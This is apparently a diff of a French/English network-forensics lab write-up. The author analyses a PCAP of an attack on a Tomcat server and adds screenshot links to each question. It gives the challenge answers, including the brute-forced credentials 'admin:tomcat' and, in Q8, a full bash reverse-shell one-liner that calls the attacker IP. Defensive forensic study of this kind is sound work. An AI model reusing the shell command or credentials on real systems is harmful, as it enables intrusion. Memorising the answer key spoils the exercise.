@@ -17,42 +17,72 @@ Network Forensics
 **What I found:** J'ai trouvé plusieurs conversations avec des adresses IP du même réseau, à l'exception d'une seule qui ressortait du lot.
 **Answer:** `14.0.0.120`
 
-(q1)[]
+
+(q1)[screenshots/1.jpeg]
 
 ### Q2 — Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?
 **What I did:** J'ai utilisé le site ipgeolocation.io pour obtenir des informations géographiques à partir de l'IP identifiée.
 **What I found:** En entrant l'IP, j'ai reçu une liste d'informations concernant cette dernière, notamment son pays d'origine.
 **Answer:** China
 
+
+(q1)[screenshots/2.jpeg]
+
 ### Q3 — From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?
 **What I did:** Si un port donne accès au serveur web, il y aura nécessairement du trafic HTTP. J'ai utilisé cela pour filtrer le trafic avec le filtre `http`.
 **What I found:** Après le filtrage, j'ai utilisé Statistics &gt; Conversations pour voir les conversations du trafic filtré, ce qui m'a permis d'identifier le port utilisé.
 **Answer:** `8080`
+
+
+(q1)[screenshots/3.jpeg]
 
 ### Q4 — Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?
 **What I did:** Puisque l'attaquant a utilisé l'énumération pour découvrir les répertoires du site, le type de paquets à chercher est donc HTTP avec la méthode GET. J'ai filtré le trafic avec `http.request.method == "GET"`.
 **What I found:** J'ai trouvé l'outil utilisé dans la section User-Agent des requêtes HTTP.
 **Answer:** Gobuster
 
+
+
+(q1)[screenshots/4.jpeg]
+
 ### Q5 — After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?
 **What I did:** J'ai filtré le trafic pour n'afficher que les paquets HTTP avec une réponse différente du code 404, en utilisant un filtre comme `http.response.code != 404`.
 **What I found:** Avec ce trafic filtré, j'ai pu accéder au Follow TCP Stream, c'est là que les détails se trouvaient.
 **Answer:** `/manager`
+
+
+
+
+(q1)[screenshots/5-1.jpeg]
+(q1)[screenshots/5-2.jpeg]
 
 ### Q6 — After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?
 **What I did:** J'ai filtré le trafic pour n'afficher que les paquets HTTP contenant des informations d'authentification, en cherchant les headers `Authorization`.
 **What I found:** J'ai accédé aux détails du dernier paquet de connexion pour voir les informations d'authentification utilisées avec succès.
 **Answer:** `admin:tomcat`
 
+
+
+(q1)[screenshots/6.jpeg]
+
 ### Q7 — Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?
 **What I did:** Du fait que l'attaquant a téléversé un fichier malveillant, j'ai filtré le trafic pour n'afficher que les paquets HTTP contenant la méthode POST avec `http.request.method == "POST"`.
 **What I found:** J'ai trouvé un paquet segmenté, donc j'ai utilisé Follow &gt; HTTP Stream pour regrouper les segments et voir le contenu complet.
 **Answer:** `JXQOZY.war`
 
+
+
+(q1)[screenshots/7.jpeg]
+(q1)[screenshots/7-2.jpeg]
+
 ### Q8 — After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?
 **What I did:** J'ai utilisé Follow TCP Stream sur le trafic contenant les paquets d'authentification, puis j'ai incrémenté le numéro de stream. Du fait que la tentative d'établir une reverse shell intervient logiquement après la tentative réussie de connexion.
 **What I found:** J'ai trouvé un stream de commandes où l'attaquant exécute des commandes système pour identifier leur lieu, leur identité, et tente d'établir la reverse shell.
 **Answer:** `/bin/bash -c 'bash -i &gt;& /dev/tcp/14.0.0.120/443 0&gt;&1'`
+
+
+
+(q1)[screenshots/8.jpeg]
 
 ## Incident Timeline
 - t=346.031483 : L'attaquant commence la phase de reconnaissance en envoyant des paquets SYN pour trouver les ports ouverts.
